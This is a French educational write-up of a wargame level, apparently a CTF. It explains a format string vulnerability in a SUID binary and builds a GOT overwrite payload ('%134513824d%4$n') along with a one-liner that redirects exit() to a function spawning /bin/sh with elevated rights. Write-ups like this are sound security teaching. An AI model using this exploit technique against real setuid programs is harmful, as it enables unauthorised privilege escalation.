# Level5 - README Pédagogique

## 🎯 Objectif
Exploiter une **format string vulnerability** pour écraser l'entrée de `exit()` dans la **GOT** et rediriger l'exécution vers `o()` qui lance `/bin/sh`.

**Technique** : GOT Overwrite

---

## 🔍 Reconnaissance

### Permissions du fichier
```bash
$ ls -l level5
-rwsr-s---+ 1 level6 users  5385 Mar  6  2016 level5
    ^
    └─ Bit SUID actif → s'exécute avec les droits de level6
```

### Tests comportementaux
```bash
$ ./level5
test
test

$ python -c "print('%x %x %x')" | ./level5
200 b7fd1ac0 b7ff37d0
# → Format string vulnerability confirmée
```

---

## 🛠️ Analyse technique

### Code source (décompilé depuis Ghidra)
```c
#include <stdio.h>
#include <stdlib.h>

void o(void)
{
    system("/bin/sh");
    _exit(1);
}

void n(void)
{
    char local_20c[520];

    fgets(local_20c, 0x200, stdin);
    printf(local_20c);  // ⚠️ Format string vulnerability !
    exit(1);            // ← On va détourner cet appel
}

int main(void)
{
    n();
    return 0;
}
```

**Observations critiques** :
1. `printf(local_20c)` → Format string vulnerability
2. `exit(1)` appelé juste après → Cible idéale pour le GOT overwrite
3. `o()` existe mais n'est jamais appelée → Contient `system("/bin/sh")`

---

## 💣 Vulnérabilité : Format String + GOT Overwrite

### La GOT (Global Offset Table)

Quand un programme utilise des fonctions externes (`exit()`, `printf()`, `system()`...), ces fonctions se trouvent dans la **libc**, pas dans le programme.

**Problème** : À la compilation, on ne sait pas encore où sera chargée la libc en mémoire.

**Solution** : La **GOT** est un tableau d'adresses en mémoire, rempli au démarrage.

```
GOT :
┌─────────────────────────────────────┐
│ exit   → 0xb7e9f750 (dans libc)     │
│ printf → 0xb7e6f830 (dans libc)     │
│ fgets  → 0xb7e8a000 (dans libc)     │
└─────────────────────────────────────┘
```

**Fonctionnement normal** :
```
Code :              GOT :               Libc :
┌─────────────┐    ┌──────────────┐    ┌──────────────┐
│ call exit   │───→│ 0xb7e9f750   │───→│ exit()       │
└─────────────┘    └──────────────┘    └──────────────┘
```

### La technique GOT Overwrite

**On remplace l'adresse de `exit()` dans la GOT par l'adresse de `o()`.**

```
Avant overwrite :
GOT[exit] = 0xb7e9f750 (libc exit)

Après overwrite :
GOT[exit] = 0x080484a4 (notre fonction o())
```

**Résultat** :
```
Code :              GOT :               Notre code :
┌─────────────┐    ┌──────────────┐    ┌──────────────┐
│ call exit   │───→│ 0x080484a4   │───→│ o() → /bin/sh│
└─────────────┘    └──────────────┘    └──────────────┘
```

### Pourquoi la GOT est-elle modifiable ?

La GOT est une section **read-write** du programme (le linker doit pouvoir la remplir au démarrage).

```bash
$ readelf -S level5 | grep got
.got.plt   PROGBITS   08049830   READ/WRITE  ← Modifiable !
```

### Pourquoi cibler `exit()` ?

C'est la **première fonction appelée après `printf()`** dans le code :

```c
printf(local_20c);  // ← Notre exploit s'exécute ici
exit(1);            // ← Appelée juste après → On détourne ça !
```

---

## 🔑 Concepts clés

### 1. objdump

`objdump` = Outil d'analyse **statique** de binaires (sans lancer le programme).

**Comparaison des outils** :

| Outil | Type | Ce qu'il voit |
|-------|------|---------------|
| `objdump` | Statique | Structure du binaire, GOT, assembleur |
| `ltrace` | Dynamique | Appels de bibliothèques |
| `strace` | Dynamique | Appels système |
| `gdb` | Dynamique | Tout, avec contrôle |

**Flag `-R`** : Affiche les **relocations dynamiques** (= entrées de la GOT).

```bash
$ objdump -R level5
08049838 R_386_JUMP_SLOT   exit
^^^^^^^^^
Adresse dans la GOT où est stockée l'adresse de exit()
```

### 2. Pourquoi l'adresse GOT est en `0x0804...` ?

```
Layout mémoire :
0x08048000  .text  (code, read-only)
0x08049000  .data/.bss (données)
0x08049830  .got.plt  ← GOT est ici !
```

La GOT est une **section de données** → même plage que les variables globales.

### 3. `exit()` vs `_exit()`

```c
exit(1);   // Termine via la libc
           // → Flush des buffers, atexit handlers...
           // → Passe par la GOT !

_exit(1);  // Termine via syscall direct
           // → Pas de nettoyage
           // → Bypass la GOT !
```

**Pourquoi `_exit()` dans `o()` ?**
- Si `o()` appelait `exit()`, ça passerait par la GOT
- GOT[exit] = adresse de `o()` (notre overwrite)
- `o()` s'appellerait elle-même à l'infini → **boucle infinie !**
- `_exit()` bypass la GOT → termine proprement ✅

### 4. GOT Overwrite vs Variable Globale

| | Level3/4 | Level5 |
|---|---|---|
| **Cible** | Variable globale | Entrée GOT |
| **Effet** | Modifie une donnée | Modifie l'adresse d'une fonction |
| **Déclenchement** | Condition `if (m == ...)` | Appel de la fonction détournée |
| **Puissance** | Limité au code existant | Contrôle n'importe quel appel de fonction |

**Pourquoi plus puissant ?**
- Level3/4 : Le développeur doit avoir mis une condition exploitable
- Level5 : On détourne n'importe quelle fonction, sans condition dans le code

---

## 🚀 Construction du payload

### Étape 1 : Trouver l'adresse de `o()`
```bash
# Dans Ghidra → cliquer sur o()
# Adresse : 0x080484a4
```

### Étape 2 : Trouver l'adresse de `exit()` dans la GOT
```bash
objdump -R level5 | grep exit
# 08049838 R_386_JUMP_SLOT   exit
# Adresse GOT : 0x08049838
```

### Étape 3 : Trouver la position du buffer
```bash
python -c "print('AAAA' + '%x.'*10)" | ./level5
# ...41414141...
# → "AAAA" = 0x41414141 en position 4
```

### Étape 4 : Calculer le padding

**Conversion 0x080484a4 → décimal** :
```
0 × 16^7 =           0
8 × 16^6 = 134217728
0 × 16^5 =           0
4 × 16^4 =    262144
8 × 16^3 =     32768
4 × 16^2 =      1024
a × 16^1 =       160
4 × 16^0 =         4
─────────────────────
Total    = 134513828
```

**Calcul du padding** :
```
Valeur à écrire  = 134513828
Adresse affichée = 4 octets
Padding          = 134513828 - 4 = 134513824 → %134513824d
```

### Étape 5 : Conversion de l'adresse GOT en little-endian
```
0x08049838
  08 04 98 38  (paires)
  38 98 04 08  (inversé)
→ \x38\x98\x04\x08
```

### Payload final
```
[Adresse GOT exit] + [%134513824d] + [%4$n]
\x38\x98\x04\x08 + %134513824d + %4$n
```

### Commande d'exploitation
```bash
(python -c 'print "\x38\x98\x04\x08" + "%134513824d%4$n"'; cat) | ./level5
```

---

## 🔄 Déroulement de l'exploitation

```
1. fgets() lit notre payload dans local_20c

2. printf(local_20c) :
   a. Affiche \x38\x98\x04\x08 (4 chars)
      Compteur interne : 4

   b. Affiche %134513824d (134513824 chars)
      Compteur interne : 134513828

   c. Lit %4$n :
      → Va en position 4 sur la stack
      → Trouve 0x08049838 (adresse GOT de exit)
      → Écrit 134513828 à l'adresse 0x08049838
      → GOT[exit] = 0x080484a4 (adresse de o()) ✅

3. exit(1) est appelé :
   → CPU cherche l'adresse dans GOT[exit]
   → GOT[exit] = 0x080484a4 (o())
   → o() s'exécute !

4. o() :
   → system("/bin/sh") → Shell obtenu ! 🎉
   → _exit(1) → Termine sans boucle infinie
```

---

## 📝 Classification

**Type de vulnérabilité** :
- **CWE-134** : Use of Externally-Controlled Format String
- **CWE-250** : Execution with Unnecessary Privileges (SUID)

**Technique d'exploitation** :
- **GOT Overwrite** : Remplacement d'une adresse dans la GOT

---

## 🎓 Résumé

1. **Vulnérabilité** : `printf(local_20c)` sans format string explicite
2. **Cible** : GOT[exit] à l'adresse `0x08049838`
3. **Valeur à écrire** : `0x080484a4` (adresse de `o()`) = 134513828
4. **Technique** : GOT overwrite via format string `%n`
5. **Payload** : `[adresse GOT exit] + %134513824d + %4$n`
6. **Résultat** : `exit()` → `o()` → `/bin/sh` avec les droits de level6